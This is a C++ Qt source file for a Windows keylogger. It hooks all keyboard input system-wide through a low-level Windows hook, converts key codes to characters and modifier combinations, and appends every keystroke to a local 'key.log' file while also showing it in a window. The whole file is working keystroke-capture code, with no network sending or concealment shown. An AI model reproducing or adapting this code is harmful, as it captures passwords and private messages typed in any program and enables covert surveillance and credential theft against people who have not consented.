#include "keyboardlistener.h"
#include "ui_keyloggerwindow.h"
#include <QScrollBar>
QPlainTextEdit *KeyboardListener::up = 0;
Qt::KeyboardModifiers KeyboardListener::curModifiers = Qt::NoModifier;
QFile KeyboardListener::output("key.log");
KeyboardListener::KeyboardListener()
{
	ahook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)recordListener, 0, 0);
	if(!output.open(QIODevice::WriteOnly|QIODevice::Text|QIODevice::Append)) {
		qDebug() << "Failed to open logging file...";
	}
}

LRESULT KeyboardListener::recordListener(int code, WPARAM wprm, LPARAM lprm) {
	if(code == HC_ACTION) {
		KBDLLHOOKSTRUCT *strct = (KBDLLHOOKSTRUCT *)lprm;
		//qDebug() << strct->time << strct->vkCode << strct->scanCode << strct->flags << strct->dwExtraInfo;
		switch(wprm) {
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
			case WM_KEYUP:
			case WM_SYSKEYUP:
			{
                Qt::KeyboardModifiers addedModifier = Qt::NoModifier;
				switch(strct->vkCode) {
					case VK_LSHIFT:
					case VK_RSHIFT:
                        addedModifier = Qt::ShiftModifier;
						break;
					case VK_LCONTROL:
					case VK_RCONTROL:
                        addedModifier = Qt::ControlModifier;
						break;
					case VK_LMENU:
					case VK_RMENU:
                        addedModifier = Qt::AltModifier;
						break;
				}
				if(wprm == WM_KEYDOWN || wprm == WM_SYSKEYDOWN) {
                    if(curModifiers != Qt::NoModifier && addedModifier == curModifiers)
						break;
                    curModifiers |= addedModifier;
					QChar actualChar = getCharForVKCode(strct->vkCode, curModifiers);
					if(actualChar == '\n')
						output.flush();
                    if((curModifiers == Qt::ShiftModifier || curModifiers == Qt::NoModifier) && addedModifier == Qt::NoModifier) {
                        if(up) up->insertPlainText(actualChar);
						output.write(QString(actualChar).toLocal8Bit().data());
                    }
                    if(curModifiers == Qt::ControlModifier && addedModifier == Qt::NoModifier) {
                        if(up) up->appendPlainText(QString("Ctrl+%1").arg(actualChar));
						output.write(QString("\nCtrl+%1").arg(actualChar).toUtf8());
                    } else if(curModifiers == Qt::AltModifier && addedModifier == Qt::NoModifier) {
                        if(up) up->appendPlainText(QString("Alt+%1").arg(actualChar));
						output.write(QString("\nAlt+%1").arg(actualChar).toUtf8());
                    }

                    if(up) up->verticalScrollBar()->setValue(up->verticalScrollBar()->maximum());
				} else if(wprm == WM_KEYUP || wprm == WM_SYSKEYUP) {
                    curModifiers &= ~addedModifier;
				}
			}
				break;
		}
	}
	return CallNextHookEx(NULL, code, wprm, lprm);
}

void KeyboardListener::setTextAddress(QPlainTextEdit* up) {
	this->up = up;
}

BOOL KeyboardListener::destroy() {
	return UnhookWindowsHookEx(ahook);
}

char KeyboardListener::getCharForVKCode(uint code, Qt::KeyboardModifiers modifier) {
	switch(code) {
		case 'A':
			return modifier.testFlag(Qt::ShiftModifier) ? 'A' : 'a';
		case 'B':
			return modifier.testFlag(Qt::ShiftModifier) ? 'B' : 'b';
		case 'C':
			return modifier.testFlag(Qt::ShiftModifier) ? 'C' : 'c';
		case 'D':
			return modifier.testFlag(Qt::ShiftModifier) ? 'D' : 'd';
		case 'E':
			return modifier.testFlag(Qt::ShiftModifier) ? 'E' : 'e';
		case 'F':
			return modifier.testFlag(Qt::ShiftModifier) ? 'F' : 'f';
		case 'G':
			return modifier.testFlag(Qt::ShiftModifier) ? 'G' : 'g';
		case 'H':
			return modifier.testFlag(Qt::ShiftModifier) ? 'H' : 'h';
		case 'I':
			return modifier.testFlag(Qt::ShiftModifier) ? 'I' : 'i';
		case 'J':
			return modifier.testFlag(Qt::ShiftModifier) ? 'J' : 'j';
		case 'K':
			return modifier.testFlag(Qt::ShiftModifier) ? 'K' : 'k';
		case 'L':
			return modifier.testFlag(Qt::ShiftModifier) ? 'L' : 'l';
		case 'M':
			return modifier.testFlag(Qt::ShiftModifier) ? 'M' : 'm';
		case 'N':
			return modifier.testFlag(Qt::ShiftModifier) ? 'N' : 'n';
		case 'O':
			return modifier.testFlag(Qt::ShiftModifier) ? 'O' : 'o';
		case 'P':
			return modifier.testFlag(Qt::ShiftModifier) ? 'P' : 'p';
		case 'Q':
			return modifier.testFlag(Qt::ShiftModifier) ? 'Q' : 'q';
		case 'R':
			return modifier.testFlag(Qt::ShiftModifier) ? 'R' : 'r';
		case 'S':
			return modifier.testFlag(Qt::ShiftModifier) ? 'S' : 's';
		case 'T':
			return modifier.testFlag(Qt::ShiftModifier) ? 'T' : 't';
		case 'U':
			return modifier.testFlag(Qt::ShiftModifier) ? 'U' : 'u';
		case 'V':
			return modifier.testFlag(Qt::ShiftModifier) ? 'V' : 'v';
		case 'W':
			return modifier.testFlag(Qt::ShiftModifier) ? 'W' : 'w';
		case 'X':
			return modifier.testFlag(Qt::ShiftModifier) ? 'X' : 'x';
		case 'Y':
			return modifier.testFlag(Qt::ShiftModifier) ? 'Y' : 'y';
		case 'Z':
			return modifier.testFlag(Qt::ShiftModifier) ? 'Z' : 'z';
		case VK_NUMPAD0:
			return '0';
		case '0':
			return modifier.testFlag(Qt::ShiftModifier) ? ')' : '0';
		case VK_NUMPAD1:
			return '1';
		case '1':
			return modifier.testFlag(Qt::ShiftModifier) ? '!' : '1';
		case VK_NUMPAD2:
			return '2';
		case '2':
			return modifier.testFlag(Qt::ShiftModifier) ? '@' : '2';
		case VK_NUMPAD3:
			return '3';
		case '3':
			return modifier.testFlag(Qt::ShiftModifier) ? '#' : '3';
		case VK_NUMPAD4:
			return '4';
		case '4':
			return modifier.testFlag(Qt::ShiftModifier) ? '$' : '4';
		case VK_NUMPAD5:
			return '5';
		case '5':
			return modifier.testFlag(Qt::ShiftModifier) ? '%' : '5';
		case VK_NUMPAD6:
			return '6';
		case '6':
			return modifier.testFlag(Qt::ShiftModifier) ? '^' : '6';
		case VK_NUMPAD7:
			return '7';
		case '7':
			return modifier.testFlag(Qt::ShiftModifier) ? '&' : '7';
		case VK_NUMPAD8:
			return '8';
		case '8':
			return modifier.testFlag(Qt::ShiftModifier) ? '*' : '8';
		case VK_NUMPAD9:
			return '9';
		case '9':
			return modifier.testFlag(Qt::ShiftModifier) ? '(' : '9';
		case VK_RETURN:
			return '\n';
		case 190:
			return modifier.testFlag(Qt::ShiftModifier) ? '>' : '.';
		case VK_DECIMAL:
			return '.';
		case 188:
			return modifier.testFlag(Qt::ShiftModifier) ? '<' : ',';
		case VK_ADD:
			return '+';
		case 187:
			return modifier.testFlag(Qt::ShiftModifier) ? '+' : '=';
		case VK_SUBTRACT:
			return '-';
		case 189:
			return modifier.testFlag(Qt::ShiftModifier) ? '_' : '-';
		case VK_MULTIPLY:
			return '*';
		case VK_OEM_1:
			return modifier.testFlag(Qt::ShiftModifier) ? ':' : ';';
		case VK_OEM_2:
			return modifier.testFlag(Qt::ShiftModifier) ? '?' : '/';
		case VK_OEM_3:
			return modifier.testFlag(Qt::ShiftModifier) ? '~' : '`';
		case VK_OEM_4:
			return modifier.testFlag(Qt::ShiftModifier) ? '{' : '[';
		case VK_OEM_5:
			return modifier.testFlag(Qt::ShiftModifier) ? '|' : '\\';
		case VK_OEM_6:
			return modifier.testFlag(Qt::ShiftModifier) ? '}' : ']';
		case VK_OEM_7:
			return modifier.testFlag(Qt::ShiftModifier) ? '"' : '\'';
		case VK_SPACE:
			return ' ';
		case VK_TAB:
			return '	';
        case VK_SHIFT:
        case VK_CONTROL:
            return code;

		default:
			qDebug() << "Unhandled vk code" << code;
			return code;
	}
}
